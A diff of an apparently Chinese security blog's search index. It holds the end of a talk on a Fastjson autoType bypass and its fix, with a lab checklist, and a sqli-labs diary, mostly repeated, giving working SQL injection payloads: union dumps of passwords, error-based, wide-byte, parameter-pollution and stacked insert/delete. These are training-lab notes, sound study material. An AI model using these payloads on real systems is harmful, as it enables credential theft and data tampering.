+<p><strong>第一，加了校验不等于校验有效。</strong> 四道闸看起来严密，但它们检查的都是”类的名字”，我塞进去的是一段”路径语法”。维度不对，再多闸也没用。</p>
+<p><strong>第二，任何”自声明即可信”的机制，在被检查对象可控时都会失效。</strong> <code>@JSONType</code> 是这样，各种 <code>trusted=true</code> 的元数据也是这样。这是同一个错误。</p>
+<p><strong>第三，修复要修在入口的语法上。</strong> 1.2.84 只加了 4 行：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (TypeUtils.hasIllegalTypeNameChars(typeName)) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 内部：typeName.indexOf(&#x27;:&#x27;) &gt;= 0 || typeName.indexOf(&#x27;!&#x27;) &gt;= 0</span></span><br></pre></td></tr></table></figure>
+
+<p>关键是<strong>位置</strong>——它在探测之前。所以 <code>jar:</code> 一出现就被拒，连读字节都到不了。</p>
+<p>防守上最有效的一条，其实不是升级，是架构：<strong>上传目录不能被类加载器寻址。</strong> 这一条对本漏洞和以后所有同类问题都有效。</p>
+<p>最后回到开头那句话：</p>
+<blockquote>
+<p>这个漏洞最值得记住的，不是它怎么打。<br>是那句——<strong>判断”是否可信”的动作，本身执行了一次加载，而通行证由被检查对象自己签发。</strong></p>
+</blockquote>
+<p>谢谢，有问题我们讨论。</p>
+<hr>
+<hr>
+<h1 id="附：台上保命清单"><a href="#附：台上保命清单" class="headerlink" title="附：台上保命清单"></a>附：台上保命清单</h1><h2 id="A-开场前-10-分钟"><a href="#A-开场前-10-分钟" class="headerlink" title="A. 开场前 10 分钟"></a>A. 开场前 10 分钟</h2><table>
+<thead>
+<tr>
+<th>检查</th>
+<th>命令 &#x2F; 动作</th>
+<th>期望</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>靶机起来了</td>
+<td>Windows：<code>cd /d C:\fj</code> → <code>java -jar app2.jar --server.port=18086</code></td>
+<td>窗口不关</td>
+</tr>
+<tr>
+<td>靶机是干净的</td>
+<td><strong>重启一次靶场</strong>（一个类名在一个 JVM 里只执行一次）</td>
+<td>避免演示时 <code>ok:true</code> 却不弹窗</td>
+</tr>
+<tr>
+<td>清掉旧证据</td>
+<td><code>del C:\fj\rce-proof-http.txt</code></td>
+<td>演示时看到的是新写的</td>
+</tr>
+<tr>
+<td>虚机 IP</td>
+<td><code>hostname -I</code></td>
+<td>记下点分和 <code>DEC</code> 两个值</td>
+</tr>
+<tr>
+<td>HTTP 服务</td>
+<td><code>cd ~/ssrf &amp;&amp; python3 -m http.server 19090 --bind 0.0.0.0</code></td>
+<td>单独窗口，一会儿要看日志</td>
+</tr>
+<tr>
+<td>自检</td>
+<td><code>curl -s -o /dev/null -w &quot;%{http_code}\n&quot; &quot;http://$IP:19090/impe&quot;</code></td>
+<td><code>200</code></td>
+</tr>
+<tr>
+<td>连通性</td>
+<td><code>curl -s -o /dev/null -w &quot;%{http_code}\n&quot; http://192.168.244.1:18086/status</code></td>
+<td><code>200</code></td>
+</tr>
+</tbody></table>
+<h2 id="B-卡住时的三条兜底"><a href="#B-卡住时的三条兜底" class="headerlink" title="B. 卡住时的三条兜底"></a>B. 卡住时的三条兜底</h2><table>
+<thead>
+<tr>
+<th>现象</th>
+<th>大概率原因</th>
+<th>一句话处理</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>命令敲完什么都不打印</td>
+<td>粘多行被拆断，或 POST 被安全软件 RST</td>
+<td>改用单行 GET <code>/trace?...&amp;step=parse</code>，<code>set +H</code> 关历史展开</td>
+</tr>
+<tr>
+<td><code>ok:true</code> 但没弹窗</td>
+<td>类名被缓存，<code>&lt;clinit&gt;</code> 没重跑</td>
+<td>重启靶场，或换 <code>impe2</code> 重打包</td>
+</tr>
+<tr>
+<td><code>stream=false</code> &#x2F; <code>autoType is not support</code></td>
+<td>类名里有点分 IP，或 jar 没起在正确目录</td>
+<td>检查 <code>DEC</code> 是否为空、<code>http.server</code> 是否在 <code>~/ssrf</code></td>
+</tr>
+</tbody></table>
+<h2 id="C-预判追问（一句话答法）"><a href="#C-预判追问（一句话答法）" class="headerlink" title="C. 预判追问（一句话答法）"></a>C. 预判追问（一句话答法）</h2><p><strong>“这不就是老的 fastjson 反序列化吗？”</strong><br>同一个家族，攻击模型变了：老的是在目标已有类里挑一个能打的，这个是”我自己写一个类给你加载”。</p>
+<p><strong>“SSRF 是必须的吗？”</strong><br>不是。SSRF 只是投递方式之一，等价于”目标有个上传功能”。它的价值在于目标没有上传入口、但有”填 URL 帮你下载”这类功能时，仍然能完成投递。</p>
+<p><strong>“关掉 autoType 是不是就没事了？”</strong><br>不是。<code>jsonType</code> 为真时条件已经成立，默认配置下这条路完全畅通。这是这个漏洞最容易被误判的地方。</p>
+<p><strong>“为什么演示用 GET 不用 POST？”</strong><br>同一个入口，<code>/trace?step=parse</code> 内部就是 <code>JSON.parse</code>。用 GET 是实操原因——我这台机器上 POST 会被安全软件重置。</p>
+<p><strong>“能不打 jar、直接给个 class 吗？”</strong><br>不行。<code>jar:</code> 协议只认 zip，裸 class 连条目都找不到，<code>getResourceAsStream</code> 直接返回空。打包不是为了压缩，是为了能被寻址。</p>
+<p><strong>“为什么不能直接 <code>jar:http://</code>，非要落地？”</strong><br>两条路都能通，区别在载荷形态：继承 <code>Throwable</code> 就能一条 JSON 打完；普通类会二次按名解析，网络流已经关了，必须换成可重读的字节源——本地文件，或者 Linux 的 <code>/proc/self/fd</code>。</p>
+<h2 id="D-时间不够时删哪里"><a href="#D-时间不够时删哪里" class="headerlink" title="D. 时间不够时删哪里"></a>D. 时间不够时删哪里</h2><p>按顺序删，删到 12 分钟：</p>
+<ol>
+<li>第三部分第 7 小节「复盘这条链」的口头展开（保留结论一句）</li>
+<li>第四部分第 3 小节「现场打链二」——只讲结构，不跑命令</li>
+<li>第二部分第 4 小节「自签的通行证」的细节，只留一句”只要注解表里有那 42 个字符就算可信”</li>
+<li>附录 C 全部不讲，留着自己接招</li>
+</ol>
+]]></content>
+      <categories>
+        <category>技术</category>
+        <category>JAVA安全</category>
+        <category>Fastjson</category>
+      </categories>
+  </entry>
+  <entry>
     <title></title>
-    <url>/2026/11/11/%E6%8A%80%E6%9C%AF/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/SQLi/Java%20%E4%B8%AD%E7%9A%84sql%20%E6%B3%A8%E5%85%A5/</url>
+    <url>/2026/11/13/%E6%8A%80%E6%9C%AF/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/SQLi/Java%20%E4%B8%AD%E7%9A%84sql%20%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[]]></content>
       <categories>
         <category>技术</category>
         <category>基础漏洞</category>
         <category>SQLi</category>
       </categories>
-  </entry>
-  <entry>
-    <title>sql 打靶日记23~75</title>
-    <url>/2026/11/05/%E6%8A%80%E6%9C%AF/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/SQLi/sql%20%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B023~75/</url>
-    <content><![CDATA[<h2 id="23"><a href="#23" class="headerlink" title="23"></a>23</h2><p>过滤了 –，#，先过滤#再过滤–，所以不能-#-来</p>
-<p>看报错’’1’’ LIMIT 0,1’，不看源码也可以知道大概sql语句是:<br><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code></p>
-<p>主要就是想办法过处理后面那个单引号，就可以用or ‘1’&#x3D;’1</p>
-<p>有两个问题，没有注释掉后面的limit，就会导致前面的句子都会处于where语句中，不能直接用group&#x2F;order by 探列数，所以只能union select 1,2,3 慢慢探<br>还有就是最后的payload<br>?id&#x3D;-1’ union select 1,group_concat(username,’:’,password) from users ,3 or ‘1’&#x3D;’1</p>
-<p>from 后面不能随便接东西，所以要写成：<br>?id&#x3D;-1’ union select 1,(select group_concat(username,’:’,password) from users),3 or ‘1’&#x3D;’1</p>
-<h2 id="24"><a href="#24" class="headerlink" title="24"></a>24</h2><h2 id="26"><a href="#26" class="headerlink" title="26"></a>26</h2><p>网上在linux环境下可以用%a0，替代空格但是我在Windows+小皮的环境就只是乱码</p>
-<p>可以报错注入，但是过滤了空格，导致select from必会产生粘连，就会出错<br>Less-26&#x2F;?id&#x3D;1%27aandnd(extractvalue(1,concat(0x7e,substring((select(group_concat(username))from(users)),1,30))))aandnd%271%27&#x3D;%271</p>
-<h2 id="26a"><a href="#26a" class="headerlink" title="26a"></a>26a</h2><p>由于不能报错注入，只能查询到库名了<br>在这浪费了巨多时间，我看网上有人说可以时间盲注，但他只写到了查询数据库名，说后面只要改代码就行，但是我是在不行，select from必出错，怀疑他在冬我，气哭了</p>
-<h2 id="27"><a href="#27" class="headerlink" title="27"></a>27</h2><p>?id&#x3D;1%27and(extractvalue(1,concat(0x7e,substring((ssselectelectelect(group_concat(username))from(users)),1,30))))and%271%27&#x3D;%271</p>
-<p>?id&#x3D;0%27%0aununionion%0assselectelectelect%0a1,(ssselectelectelect%0agroup_concat(username,%27:%27,password)%0afrom%0ausers),2%0aor%0a%271%27&#x3D;%271</p>
-<p>$id&#x3D; preg_replace(‘&#x2F;[ +]&#x2F;‘,””, $id);，只过滤普通空格和’+‘<br>$id&#x3D; preg_replace(‘&#x2F;[\s]&#x2F;‘,””, $id);，过滤了所有形式的空格，全部空白字符集合<br>这也是27可以用union查询的原因</p>
-<h2 id="27a"><a href="#27a" class="headerlink" title="27a"></a>27a</h2><p>变成双引号和去掉了报错</p>
-<h2 id="28"><a href="#28" class="headerlink" title="28"></a>28</h2><p>?id&#x3D;0%27)%0aunion%0aunion%0aselect%0aselect%0a1,(select%0agroup_concat(password)%0afrom%0ausers),2%0aor%0a%271%27&#x3D;(%271</p>
-<h2 id="29"><a href="#29" class="headerlink" title="29"></a>29</h2><p>白名单id1全数字</p>
-<p><code>$qs = $_SERVER[&#39;QUERY_STRING&#39;];</code><br><code>$_SERVER[&#39;QUERY_STRING&#39;]</code>用于获取 URL 问号后的原始查询串，不经过 PHP 参数解析；靶场通过它手动解析取出第一个 id，模拟 JSP 参数解析逻辑，制造 HPP（HTTP 参数污染）的校验与执行参数不一致的漏洞。</p>
-<p><code>explode(&quot;&amp;&quot;,$q_s)</code>：<strong>把字符串，按照 <code>&amp;</code> 这个字符切割，切成数组</strong></p>
-<p>?id&#x3D;2&amp;id&#x3D;0’%20union%20select%201,2,group_concat(password)%20from%20users%20–+</p>
-<h2 id="30"><a href="#30" class="headerlink" title="30"></a>30</h2><p>同29，单引号变双引号</p>
-<h2 id="31"><a href="#31" class="headerlink" title="31"></a>31</h2><p>给输入内容自动加双引号</p>
-<p>?id&#x3D;2&amp;id&#x3D;0”)%20union%20select%201,group_concat(password),3%20from%20users%20–+</p>
-<h2 id="32"><a href="#32" class="headerlink" title="32"></a>32</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function check_addslashes($string)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    $string = preg_replace(&#x27;/&#x27;. preg_quote(&#x27;\\&#x27;) .&#x27;/&#x27;, &quot;\\\\\\&quot;, $string);          </span><br><span class="line"></span><br><span class="line">    $string = preg_replace(&#x27;/\&#x27;/i&#x27;, &#x27;\\\&#x27;&#x27;, $string);                  </span><br><span class="line"></span><br><span class="line">    $string = preg_replace(&#x27;/\&quot;/&#x27;, &quot;\\\&quot;&quot;, $string);                   </span><br><span class="line"></span><br><span class="line">    return $string;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>只要输入<code>&#39;</code>，PHP 就会**自动加反斜杠转义变成 <code>\&#39;</code>**，直接写<code>1&#39;</code>会变成<code>1\&#39;</code>，单引号失效，没法闭合。</p>
-<blockquote>
-<p>数据库连接编码是 GBK，<strong>GBK 是双字节编码，两个字节算 1 个汉字</strong>。</p>
-</blockquote>
-<h2 id="绕过原理（重点）"><a href="#绕过原理（重点）" class="headerlink" title="绕过原理（重点）"></a>绕过原理（重点）</h2><p>你传：<code>%df%27</code>（URL 编码：<code>%df</code> + 单引号<code>%27</code>）</p>
-<ol>
-<li>PHP 收到，看到<code>&#39;</code>，给它加反斜杠：<code>%df%5c%27</code></li>
-<li>MySQL 以 GBK 解析：<code>%df%5c</code> 拼成<strong>一个合法 GBK 汉字</strong>，吃掉这个<code>\</code></li>
-<li>剩下单独的<code>%27</code>也就是**单引号’**，成功逃逸，用来闭合 SQL。</li>
-</ol>
-<blockquote>
-<p>一句话：<code>%df</code>或<code>%aa</code>吃掉 PHP 自动添加的反斜杠，释放出单引号。</p>
-</blockquote>
-<p>payload:<br>?id&#x3D;0%df%27%20union%20select%201,2,group_concat(password)%20from%20users%20–+</p>
-<h2 id="33"><a href="#33" class="headerlink" title="33"></a>33</h2><p>Less32 使用手写自定义函数，通过多轮正则替换转义<code>\</code>、<code>&#39;</code>、<code>&quot;</code>，不处理空字节<code>\0</code>；Less33 直接使用 PHP 原生<code>addslashes()</code>，可同时转义<code>\</code>、<code>&#39;</code>、<code>&quot;</code>、<code>\0</code>。二者均为 PHP 层面的字符转义，在 MySQL 使用 GBK 字符集的场景下，都可以被宽字节注入<code>%df%27</code>绕过。</p>
-<h2 id="34"><a href="#34" class="headerlink" title="34"></a>34</h2><p>改为post，不能在输入框里输payload，浏览器会二次编码，可以在burp，然后就是注意列数</p>
-<p>uname&#x3D;admin %df%27 union select 1,group_concat(password) from users #  &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</p>
-<h2 id="35"><a href="#35" class="headerlink" title="35"></a>35</h2><p> ?id&#x3D;0 union%20select%201,group_concat(password),3%20from%20users%20–+</p>
-<h2 id="36"><a href="#36" class="headerlink" title="36"></a>36</h2><p>?id&#x3D;0%aa%27union%20select%201,group_concat(password),3%20from%20users%20–+</p>
-<h2 id="37"><a href="#37" class="headerlink" title="37"></a>37</h2><p>post<br>uname&#x3D;0%aa%27union%20select%201,group_concat(password)%20from%20users%20–+&amp;passwd&#x3D;&amp;submit&#x3D;Submit</p>
-<h1 id="Stacked-injections"><a href="#Stacked-injections" class="headerlink" title="Stacked injections"></a>Stacked injections</h1><h2 id="38"><a href="#38" class="headerlink" title="38"></a>38</h2><p>堆叠注入：<br>审计源码时，判断是否存在堆叠注入，优先查找数据库执行函数：</p>
-<ol>
-<li>若使用<code>mysqli_multi_query()</code>，代表支持一次执行多条 SQL，存在堆叠注入的底层条件；</li>
-<li>检查用户输入是否直接字符串拼接进 SQL，若无过滤 &#x2F; 预编译，则漏洞可利用；</li>
-<li>配套出现<code>mysqli_more_results()</code>、<code>mysqli_next_result()</code>，是处理多条 SQL 结果集的配套函数，进一步佐证多语句执行能力。</li>
-</ol>
-<p>可以在第二条语句执行增删改，也可以查但是没有回显</p>
-<h1 id="核心两点："><a href="#核心两点：" class="headerlink" title="核心两点："></a>核心两点：</h1><ol>
-<li>前面关卡：数据库连接写在外部文件 <code>sql-connections/sql-connect.php</code>，用<code>include</code>引入，连接变量写在别的文件，本页面看不到。</li>
-</ol>
-<p>php</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include(&quot;../sql-connections/sql-connect.php&quot;);</span><br></pre></td></tr></table></figure>
-
-<p>连接代码在外部文件，所以当前页面源码看不到<code>mysql_connect</code>。</p>
-<ol start="2">
-<li><strong>Less38 把数据库连接代码直接写在当前 php 文件内部，不再引入外部连接文件</strong>，并且选用<code>mysqli</code>扩展 + <code>mysqli_multi_query</code>做多语句堆叠查询。</li>
-</ol>
-<h2 id="靶场作者这么设计的原因（CTF-报告直接写）"><a href="#靶场作者这么设计的原因（CTF-报告直接写）" class="headerlink" title="靶场作者这么设计的原因（CTF 报告直接写）"></a>靶场作者这么设计的原因（CTF 报告直接写）</h2><ol>
-<li><p><strong>为了演示<code>mysqli_multi_query</code>的完整使用流程</strong></p>
-<p> <code>mysqli_multi_query</code>、<code>mysqli_more_results</code>、<code>mysqli_next_result</code> 全都**依赖 mysqli 的连接句柄<code>$con1</code>**。</p>
-<p> 作者直接把 mysqli 连接写在当前页面，方便你一次性看完整套完整代码：</p>
-<p> 建立连接 → 拼接可控 id → multi_query 执行多条 SQL → 判断多结果集。</p>
-<p> 如果继续用外部 include，你还要去翻另一个文件看 mysqli 连接，不方便学习。</p>
-</li>
-<li><p><strong>区分两套数据库 API：老 mysql 扩展 vs mysqli 扩展</strong></p>
-<p> 前面宽字节关卡用的是废弃的<code>mysql_*</code>函数，写在外部公共连接文件。</p>
-<p> 38 是新知识点「堆叠注入」，专门切换到<code>mysqli</code>这套 API，<strong>直接在本页面写连接代码，清晰展示 mysqli 整套调用</strong>，用来教学。</p>
-</li>
-<li><p>设计考察点：</p>
-<p> 考察审计的时候，能认出<code>mysqli_multi_query</code>，理解它依赖 mysqli 连接，支持分号多条 SQL。</p>
-</li>
-</ol>
-<h2 id="39"><a href="#39" class="headerlink" title="39"></a>39</h2><p>与38相同，只是没有闭合</p>
-<h2 id="40"><a href="#40" class="headerlink" title="40"></a>40</h2><p>40为’)闭合<br>?id&#x3D;1&amp;id&#x3D;0‘) union select 1,2,group_concat(username) from users –+</p>
-<h2 id="41"><a href="#41" class="headerlink" title="41"></a>41</h2><p>?id&#x3D;1&amp;id&#x3D;0 union select 1,2,group_concat(username) from users –+</p>
-<h2 id="42"><a href="#42" class="headerlink" title="42"></a>42</h2><p>注入点在password<br>‘ ;insert into users(username,password) values(‘zsy’,’520’);#<br>‘ ;delete from users where username&#x3D;’zsy’;#</p>
-<h2 id="43"><a href="#43" class="headerlink" title="43"></a>43</h2><p>同42，变为’)闭合</p>
-<h2 id="44"><a href="#44" class="headerlink" title="44"></a>44</h2><p>没报错了，单引号闭合</p>
-<h2 id="45"><a href="#45" class="headerlink" title="45"></a>45</h2><p>‘)闭合</p>
-<h2 id="46"><a href="#46" class="headerlink" title="46"></a>46</h2><p>?sort&#x3D;1%20and%20extractvalue(1,concat(0x7e,substring((select%20group_concat(username,%27:%27,password)%20from%20users),1,30))) –+</p>
-<h2 id="47"><a href="#47" class="headerlink" title="47"></a>47</h2><p>?sort&#x3D;1%27%20and%20extractvalue(1,concat(0x7e,substring((select%20group_concat(username,%27:%27,password)%20from%20users),1,30)))%20–+</p>
-<h2 id="48"><a href="#48" class="headerlink" title="48"></a>48</h2><p>用盲注的方法，懒得写了</p>
-<h2 id="49"><a href="#49" class="headerlink" title="49"></a>49</h2><p>同样的变成了字符型而已</p>
-<h2 id="50"><a href="#50" class="headerlink" title="50"></a>50</h2><p>?sort&#x3D;1;insert into users(id,username,password) values(15,’zsy’,’520’);–+</p>
-<h2 id="51"><a href="#51" class="headerlink" title="51"></a>51</h2><p>同50，加单引号闭合</p>
-<h2 id="52"><a href="#52" class="headerlink" title="52"></a>52</h2><p>同50，无报错</p>
-<h2 id="53"><a href="#53" class="headerlink" title="53"></a>53</h2><p>同52，加单引号闭合</p>
-<h1 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h1><h2 id="54"><a href="#54" class="headerlink" title="54"></a>54</h2><p>头一次打挑战关卡，感觉有意思多了<br>数字型 union，没什么难度</p>
-<h2 id="55"><a href="#55" class="headerlink" title="55"></a>55</h2><p>加了()闭合，</p>
-<h2 id="56"><a href="#56" class="headerlink" title="56"></a>56</h2><p>单引号闭合</p>
-<h2 id="57"><a href="#57" class="headerlink" title="57"></a>57</h2>]]></content>
-      <categories>
-        <category>技术</category>
-        <category>基础漏洞</category>
-        <category>SQLi</category>
-      </categories>
-      <tags>
-        <tag>sql靶场</tag>
-      </tags>
   </entry>
   <entry>
     <title>Oracle sql</title>
@@ -1163,6 +1979,111 @@
       </categories>
       <tags>
         <tag>Orclesql</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sql 打靶日记23~75</title>
+    <url>/2026/11/05/%E6%8A%80%E6%9C%AF/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/SQLi/sql%20%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B023~75/</url>
+    <content><![CDATA[<h2 id="23"><a href="#23" class="headerlink" title="23"></a>23</h2><p>过滤了 –，#，先过滤#再过滤–，所以不能-#-来</p>
+<p>看报错’’1’’ LIMIT 0,1’，不看源码也可以知道大概sql语句是:<br><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code></p>
+<p>主要就是想办法过处理后面那个单引号，就可以用or ‘1’&#x3D;’1</p>
+<p>有两个问题，没有注释掉后面的limit，就会导致前面的句子都会处于where语句中，不能直接用group&#x2F;order by 探列数，所以只能union select 1,2,3 慢慢探<br>还有就是最后的payload<br>?id&#x3D;-1’ union select 1,group_concat(username,’:’,password) from users ,3 or ‘1’&#x3D;’1</p>
+<p>from 后面不能随便接东西，所以要写成：<br>?id&#x3D;-1’ union select 1,(select group_concat(username,’:’,password) from users),3 or ‘1’&#x3D;’1</p>
+<h2 id="24"><a href="#24" class="headerlink" title="24"></a>24</h2><h2 id="26"><a href="#26" class="headerlink" title="26"></a>26</h2><p>网上在linux环境下可以用%a0，替代空格但是我在Windows+小皮的环境就只是乱码</p>
+<p>可以报错注入，但是过滤了空格，导致select from必会产生粘连，就会出错<br>Less-26&#x2F;?id&#x3D;1%27aandnd(extractvalue(1,concat(0x7e,substring((select(group_concat(username))from(users)),1,30))))aandnd%271%27&#x3D;%271</p>
+<h2 id="26a"><a href="#26a" class="headerlink" title="26a"></a>26a</h2><p>由于不能报错注入，只能查询到库名了<br>在这浪费了巨多时间，我看网上有人说可以时间盲注，但他只写到了查询数据库名，说后面只要改代码就行，但是我是在不行，select from必出错，怀疑他在冬我，气哭了</p>
+<h2 id="27"><a href="#27" class="headerlink" title="27"></a>27</h2><p>?id&#x3D;1%27and(extractvalue(1,concat(0x7e,substring((ssselectelectelect(group_concat(username))from(users)),1,30))))and%271%27&#x3D;%271</p>
+<p>?id&#x3D;0%27%0aununionion%0assselectelectelect%0a1,(ssselectelectelect%0agroup_concat(username,%27:%27,password)%0afrom%0ausers),2%0aor%0a%271%27&#x3D;%271</p>
+<p>$id&#x3D; preg_replace(‘&#x2F;[ +]&#x2F;‘,””, $id);，只过滤普通空格和’+‘<br>$id&#x3D; preg_replace(‘&#x2F;[\s]&#x2F;‘,””, $id);，过滤了所有形式的空格，全部空白字符集合<br>这也是27可以用union查询的原因</p>
+<h2 id="27a"><a href="#27a" class="headerlink" title="27a"></a>27a</h2><p>变成双引号和去掉了报错</p>
+<h2 id="28"><a href="#28" class="headerlink" title="28"></a>28</h2><p>?id&#x3D;0%27)%0aunion%0aunion%0aselect%0aselect%0a1,(select%0agroup_concat(password)%0afrom%0ausers),2%0aor%0a%271%27&#x3D;(%271</p>
+<h2 id="29"><a href="#29" class="headerlink" title="29"></a>29</h2><p>白名单id1全数字</p>
+<p><code>$qs = $_SERVER[&#39;QUERY_STRING&#39;];</code><br><code>$_SERVER[&#39;QUERY_STRING&#39;]</code>用于获取 URL 问号后的原始查询串，不经过 PHP 参数解析；靶场通过它手动解析取出第一个 id，模拟 JSP 参数解析逻辑，制造 HPP（HTTP 参数污染）的校验与执行参数不一致的漏洞。</p>
+<p><code>explode(&quot;&amp;&quot;,$q_s)</code>：<strong>把字符串，按照 <code>&amp;</code> 这个字符切割，切成数组</strong></p>
+<p>?id&#x3D;2&amp;id&#x3D;0’%20union%20select%201,2,group_concat(password)%20from%20users%20–+</p>
+<h2 id="30"><a href="#30" class="headerlink" title="30"></a>30</h2><p>同29，单引号变双引号</p>
+<h2 id="31"><a href="#31" class="headerlink" title="31"></a>31</h2><p>给输入内容自动加双引号</p>
+<p>?id&#x3D;2&amp;id&#x3D;0”)%20union%20select%201,group_concat(password),3%20from%20users%20–+</p>
+<h2 id="32"><a href="#32" class="headerlink" title="32"></a>32</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function check_addslashes($string)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    $string = preg_replace(&#x27;/&#x27;. preg_quote(&#x27;\\&#x27;) .&#x27;/&#x27;, &quot;\\\\\\&quot;, $string);          </span><br><span class="line"></span><br><span class="line">    $string = preg_replace(&#x27;/\&#x27;/i&#x27;, &#x27;\\\&#x27;&#x27;, $string);                  </span><br><span class="line"></span><br><span class="line">    $string = preg_replace(&#x27;/\&quot;/&#x27;, &quot;\\\&quot;&quot;, $string);                   </span><br><span class="line"></span><br><span class="line">    return $string;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>只要输入<code>&#39;</code>，PHP 就会**自动加反斜杠转义变成 <code>\&#39;</code>**，直接写<code>1&#39;</code>会变成<code>1\&#39;</code>，单引号失效，没法闭合。</p>
+<blockquote>
+<p>数据库连接编码是 GBK，<strong>GBK 是双字节编码，两个字节算 1 个汉字</strong>。</p>
+</blockquote>
+<h2 id="绕过原理（重点）"><a href="#绕过原理（重点）" class="headerlink" title="绕过原理（重点）"></a>绕过原理（重点）</h2><p>你传：<code>%df%27</code>（URL 编码：<code>%df</code> + 单引号<code>%27</code>）</p>
+<ol>
+<li>PHP 收到，看到<code>&#39;</code>，给它加反斜杠：<code>%df%5c%27</code></li>
+<li>MySQL 以 GBK 解析：<code>%df%5c</code> 拼成<strong>一个合法 GBK 汉字</strong>，吃掉这个<code>\</code></li>
+<li>剩下单独的<code>%27</code>也就是**单引号’**，成功逃逸，用来闭合 SQL。</li>
+</ol>
+<blockquote>
+<p>一句话：<code>%df</code>或<code>%aa</code>吃掉 PHP 自动添加的反斜杠，释放出单引号。</p>
+</blockquote>
+<p>payload:<br>?id&#x3D;0%df%27%20union%20select%201,2,group_concat(password)%20from%20users%20–+</p>
+<h2 id="33"><a href="#33" class="headerlink" title="33"></a>33</h2><p>Less32 使用手写自定义函数，通过多轮正则替换转义<code>\</code>、<code>&#39;</code>、<code>&quot;</code>，不处理空字节<code>\0</code>；Less33 直接使用 PHP 原生<code>addslashes()</code>，可同时转义<code>\</code>、<code>&#39;</code>、<code>&quot;</code>、<code>\0</code>。二者均为 PHP 层面的字符转义，在 MySQL 使用 GBK 字符集的场景下，都可以被宽字节注入<code>%df%27</code>绕过。</p>
+<h2 id="34"><a href="#34" class="headerlink" title="34"></a>34</h2><p>改为post，不能在输入框里输payload，浏览器会二次编码，可以在burp，然后就是注意列数</p>
+<p>uname&#x3D;admin %df%27 union select 1,group_concat(password) from users #  &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</p>
+<h2 id="35"><a href="#35" class="headerlink" title="35"></a>35</h2><p> ?id&#x3D;0 union%20select%201,group_concat(password),3%20from%20users%20–+</p>
+<h2 id="36"><a href="#36" class="headerlink" title="36"></a>36</h2><p>?id&#x3D;0%aa%27union%20select%201,group_concat(password),3%20from%20users%20–+</p>
+<h2 id="37"><a href="#37" class="headerlink" title="37"></a>37</h2><p>post<br>uname&#x3D;0%aa%27union%20select%201,group_concat(password)%20from%20users%20–+&amp;passwd&#x3D;&amp;submit&#x3D;Submit</p>
+<h1 id="Stacked-injections"><a href="#Stacked-injections" class="headerlink" title="Stacked injections"></a>Stacked injections</h1><h2 id="38"><a href="#38" class="headerlink" title="38"></a>38</h2><p>堆叠注入：<br>审计源码时，判断是否存在堆叠注入，优先查找数据库执行函数：</p>
+<ol>
+<li>若使用<code>mysqli_multi_query()</code>，代表支持一次执行多条 SQL，存在堆叠注入的底层条件；</li>
+<li>检查用户输入是否直接字符串拼接进 SQL，若无过滤 &#x2F; 预编译，则漏洞可利用；</li>
+<li>配套出现<code>mysqli_more_results()</code>、<code>mysqli_next_result()</code>，是处理多条 SQL 结果集的配套函数，进一步佐证多语句执行能力。</li>
+</ol>
+<p>可以在第二条语句执行增删改，也可以查但是没有回显</p>
+<h1 id="核心两点："><a href="#核心两点：" class="headerlink" title="核心两点："></a>核心两点：</h1><ol>
+<li>前面关卡：数据库连接写在外部文件 <code>sql-connections/sql-connect.php</code>，用<code>include</code>引入，连接变量写在别的文件，本页面看不到。</li>
+</ol>
+<p>php</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include(&quot;../sql-connections/sql-connect.php&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>连接代码在外部文件，所以当前页面源码看不到<code>mysql_connect</code>。</p>
+<ol start="2">
+<li><strong>Less38 把数据库连接代码直接写在当前 php 文件内部，不再引入外部连接文件</strong>，并且选用<code>mysqli</code>扩展 + <code>mysqli_multi_query</code>做多语句堆叠查询。</li>
+</ol>
+<h2 id="靶场作者这么设计的原因（CTF-报告直接写）"><a href="#靶场作者这么设计的原因（CTF-报告直接写）" class="headerlink" title="靶场作者这么设计的原因（CTF 报告直接写）"></a>靶场作者这么设计的原因（CTF 报告直接写）</h2><ol>
+<li><p><strong>为了演示<code>mysqli_multi_query</code>的完整使用流程</strong></p>
+<p> <code>mysqli_multi_query</code>、<code>mysqli_more_results</code>、<code>mysqli_next_result</code> 全都**依赖 mysqli 的连接句柄<code>$con1</code>**。</p>
+<p> 作者直接把 mysqli 连接写在当前页面，方便你一次性看完整套完整代码：</p>
+<p> 建立连接 → 拼接可控 id → multi_query 执行多条 SQL → 判断多结果集。</p>
+<p> 如果继续用外部 include，你还要去翻另一个文件看 mysqli 连接，不方便学习。</p>
+</li>
+<li><p><strong>区分两套数据库 API：老 mysql 扩展 vs mysqli 扩展</strong></p>
+<p> 前面宽字节关卡用的是废弃的<code>mysql_*</code>函数，写在外部公共连接文件。</p>
